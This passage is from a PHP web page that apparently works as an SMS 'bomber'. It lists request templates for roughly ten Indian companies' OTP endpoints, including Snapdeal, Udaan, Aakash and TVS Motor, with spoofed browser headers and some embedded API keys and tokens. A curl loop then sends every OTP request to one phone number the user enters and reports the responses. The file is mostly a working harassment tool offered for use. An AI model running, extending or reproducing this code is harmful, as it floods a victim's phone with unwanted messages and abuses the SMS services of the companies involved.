                    "sec-ch-ua-mobile: ?1",
                    "User-Agent: Mozilla/5.0 (Linux; Android 13; OPPO Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.178 Mobile Safari/537.36",
                    "Content-Type: application/json",
                    "Accept: application/json, text/plain, */*",
                    "company-code: GJ",
                    "user-type: appUser",
                    "sec-ch-ua-platform: \"Android\"",
                    "Origin: https://web.gamerji.com",
                    "x-requested-with: mark.via.gp",
                    "sec-fetch-site: cross-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "Referer: https://web.gamerji.com/",
                    "Accept-Encoding: gzip, deflate, br",
                    "Accept-Language: en-US,en;q=0.9",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "type" => "otpRequest",
                    "platform" => "webapp",
                    "username" => $mobile,
                    "phoneCode" => "+91",
                    "country" => "611e04284ac17121fd8b1a54",
                    "code" => null,
                    "campaignId" => "631c373b0872b0c5fec0198f"
                ])
            ],
            
            // 65. Snapdeal
            [
                "name" => "65. Snapdeal OTP",
                "url" => "https://m.snapdeal.com/signupCompleteAjax",
                "headers" => [
                    "Content-Type: application/json",
                    "Accept: application/json",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: m.snapdeal.com",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => json_encode([
                    "j_password" => null,
                    "j_mobilenumber" => $mobile,
                    "agree" => true,
                    "j_confpassword" => null,
                    "journey" => "mobile",
                    "numberEdit" => false,
                    "swp" => true,
                    "j_fullname" => "Lucifer"
                ])
            ],
            
            // 66. Udaan
            [
                "name" => "66. Udaan OTP",
                "url" => "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
                "headers" => [
                    "Content-Type: application/x-www-form-urlencoded",
                    "Accept: application/json",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: auth.udaan.com",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => "mobile=" . $mobile
            ],
            
            // 67. MagicPin
            [
                "name" => "67. MagicPin OTP",
                "url" => "https://magicpin.in/api/magicSendOtp",
                "headers" => [
                    "Content-Type: application/json",
                    "Accept: application/json",
                    "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001)",
                    "Host: magicpin.in",
                    "Connection: Keep-Alive",
                    "Accept-Encoding: gzip"
                ],
                "data" => json_encode([
                    "phone" => $mobile,
                    "sendSixDigitOtp" => true
                ])
            ],
            
            // 68. Aakash
            [
                "name" => "68. Aakash OTP",
                "url" => "https://antheapi.aakash.ac.in/api/generate-lead-otp",
                "headers" => [
                    "Host: antheapi.aakash.ac.in",
                    "cache-control: max-age=0",
                    "sec-ch-ua-platform: \"Android\"",
                    "user-agent: Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36",
                    "sec-ch-ua: \"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                    "content-type: application/json",
                    "x-client-id: a6fbf1d2-27c3-46e1-b149-0380e506b763",
                    "sec-ch-ua-mobile: ?1",
                    "accept: */*",
                    "origin: https://www.aakash.ac.in",
                    "x-requested-with: mark.via.gp",
                    "sec-fetch-site: same-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://www.aakash.ac.in/",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "accept-language: en-US,en;q=0.9",
                    "priority: u=1, i",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "mobile_psid" => $mobile,
                    "mobile_number" => "",
                    "activity_type" => "aakash-myadmission",
                    "webengageData" => [
                        "profile" => "student",
                        "whatsapp_opt_in" => true,
                        "method" => "mobile"
                    ]
                ])
            ],
            
            // 69. SouTickets
            [
                "name" => "69. SouTickets OTP",
                "url" => "https://www.soutickets.in/api/public/otp/generateOtp/" . $mobile,
                "headers" => [
                    "Host: www.soutickets.in",
                    "sec-ch-ua-platform: \"Android\"",
                    "authorization: apikey e4a718a6-ba0f-4b99-aef9-e5786a0923f4",
                    "user-agent: Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36",
                    "accept: application/json, text/plain, */*",
                    "sec-ch-ua: \"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                    "content-type: application/json",
                    "sec-ch-ua-mobile: ?1",
                    "origin: http://www.soutickets.in",
                    "x-requested-with: mark.via.gp",
                    "sec-fetch-site: cross-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: http://www.soutickets.in/",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "accept-language: en-US,en;q=0.9",
                    "priority: u=1, i",
                    "Connection: Keep-Alive"
                ],
                "data" => "",
                "method" => "POST"
            ],
            
            // 70. TvsMotor
            [
                "name" => "70. TvsMotor OTP",
                "url" => "https://www.tvsmotor.com/api/Ecommerce/GetOtp",
                "headers" => [
                    "Host: www.tvsmotor.com",
                    "sec-ch-ua-platform: \"Android\"",
                    "sec-ch-ua: \"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                    "sec-ch-ua-mobile: ?1",
                    "x-requested-with: XMLHttpRequest",
                    "adrum: isAjax:true",
                    "accept: */*",
                    "content-type: application/x-www-form-urlencoded; charset=UTF-8",
                    "user-agent: Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36",
                    "origin: https://www.tvsmotor.com",
                    "sec-fetch-site: same-origin",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://www.tvsmotor.com/account/login",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "accept-language: en-US,en;q=0.9",
                    "priority: u=1, i",
                    "Connection: Keep-Alive"
                ],
                "data" => "MobileNumber=" . $mobile . "&Locale=V"
            ],
            
            // 71. TrueBil
            [
                "name" => "71. TrueBil OTP",
                "url" => "https://api-v2.truebil.com/api/c/user/otp-request/v2/",
                "headers" => [
                    "Host: api-v2.truebil.com",
                    "sec-ch-ua-platform: \"Android\"",
                    "procurement-category: bcm",
                    "user-agent: Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36",
                    "sec-ch-ua: \"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                    "content-type: application/json",
                    "sec-ch-ua-mobile: ?1",
                    "platform: mweb_android",
                    "accept: */*",
                    "origin: https://www.truebil.com",
                    "x-requested-with: mark.via.gp",
                    "sec-fetch-site: same-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "accept-language: en-US,en;q=0.9",
                    "priority: u=1, i",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "contact_number" => $mobile,
                    "whatsapp" => false,
                    "code_len" => 4
                ])
            ],
            
            // 72. OnSiteGo
            [
                "name" => "72. OnSiteGo OTP",
                "url" => "https://onsitego.com/api/v3/otp/send_otp",
                "headers" => [
                    "Host: onsitego.com",
                    "Connection: keep-alive",
                    "sec-ch-ua-platform: \"Android\"",
                    "X-CSRFToken: bHURAWVnl81wDSUafT0kJAn4FvAoIVWW",
                    "sec-ch-ua: \"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                    "sec-ch-ua-mobile: ?1",
                    "baggage: sentry-environment=production,sentry-release=r8sXiIy5B-244D26MgLOv,sentry-public_key=888e742632224207a3f6434068e2f1f4,sentry-trace_id=4b17bf3507f148ef912d049eb3922c40",
                    "sentry-trace: 4b17bf3507f148ef912d049eb3922c40-a2cd660ba3ac2aef-1",
                    "User-Agent: Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36",
                    "Accept: application/json",
                    "Content-Type: application/json",
                    "Origin: https://onsitego.com",
                    "X-Requested-With: mark.via.gp",
                    "Sec-Fetch-Site: same-origin",
                    "Sec-Fetch-Mode: cors",
                    "Sec-Fetch-Dest: empty",
                    "Referer: https://onsitego.com/login?next=/account/profile",
                    "Accept-Encoding: gzip, deflate, br, zstd",
                    "Accept-Language: en-US,en;q=0.9",
                    "priority: u=1, i"
                ],
                "data" => json_encode([
                    "application" => "website",
                    "data" => [
                        "phone" => $mobile,
                        "type" => "customer-login",
                        "template" => "otp_customer_auth"
                    ]
                ])
            ],
            
            // 73. IBO (Repeated)
            [
                "name" => "73. IBO OTP",
                "url" => "https://api.ibo.com/s/authn/api/v1/otp-generate",
                "headers" => [
                    "Host: api.ibo.com",
                    "sec-ch-ua-platform: \"Android\"",
                    "user-agent: Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36",
                    "sec-ch-ua: \"Android WebView\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
                    "content-type: application/json",
                    "x-channel-id: WEB",
                    "sec-ch-ua-mobile: ?1",
                    "x-user-journey-id: dad9eca3-84d0-43dd-af32-c3ca750253cc",
                    "accept: */*",
                    "origin: https://www.ibo.com",
                    "x-requested-with: mark.via.gq",
                    "sec-fetch-site: same-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://www.ibo.com/",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "accept-language: en-US,en;q=0.9",
                    "Connection: Keep-Alive"
                ],
                "data" => json_encode([
                    "phone_number" => [
                        "number" => $mobile,
                        "country_code" => "+91"
                    ]
                ])
            ]
        ];

        echo "<h2>Results for Mobile: " . $mobile . "</h2>";
        echo "<p>Total APIs: " . count($apis) . "</p>";
        
        foreach ($apis as $api) {
            echo "<div class='api-result'>";
            echo "<p class='api-name'>" . $api['name'] . "</p>";
            
            $ch = curl_init();
            
            // Set curl options
            curl_setopt($ch, CURLOPT_URL, $api['url']);
            
            if (isset($api['method']) && $api['method'] == 'GET') {
                curl_setopt($ch, CURLOPT_HTTPGET, true);
            } else {
                curl_setopt($ch, CURLOPT_POST, true);
                if ($api['data']) {
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $api['data']);
                }
            }
            
            curl_setopt($ch, CURLOPT_HTTPHEADER, $api['headers']);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            
            $response = curl_exec($ch);
            $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $error = curl_error($ch);
            
            curl_close($ch);
            
            echo "<p><strong>URL:</strong> " . htmlspecialchars($api['url']) . "</p>";
            echo "<p><strong>Status Code:</strong> <span class='" . ($httpcode == 200 ? 'success' : 'error') . "'>" . $httpcode . "</span></p>";
            
            if ($error) {
                echo "<p><strong>Error:</strong> <span class='error'>" . $error . "</span></p>";
            }
            
            if ($response) {
                echo "<p><strong>Response:</strong> " . htmlspecialchars(substr($response, 0, 500));
                if (strlen($response) > 500) {
                    echo "... [truncated]";
                }
                echo "</p>";
            }
            
            echo "</div>";
        }
        
        echo "<hr><h3>All APIs processed for mobile number: " . $mobile . "</h3>";
    }
    ?>
</body>
</html>